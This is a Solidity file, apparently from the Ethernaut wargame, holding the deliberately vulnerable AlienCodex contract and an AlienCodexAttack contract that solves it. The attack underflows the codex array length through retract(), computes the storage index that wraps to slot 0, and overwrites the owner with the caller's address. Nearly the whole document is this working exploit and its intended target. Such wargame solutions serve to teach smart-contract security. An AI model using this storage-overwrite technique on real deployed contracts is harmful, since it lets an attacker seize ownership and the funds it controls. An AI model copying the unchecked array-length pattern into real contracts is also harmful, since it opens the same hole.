// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract AlienCodexAttack {

  constructor(AlienCodex _target) public {
    _target.make_contact();
    _target.retract();

    uint256 array_slot = uint256(keccak256(abi.encode(uint256(1))));
    uint256 index = -array_slot;
    _target.revise(index, bytes32(uint256(uint160(msg.sender))));

    require(_target.owner() == msg.sender, "Attack failed");
  }
}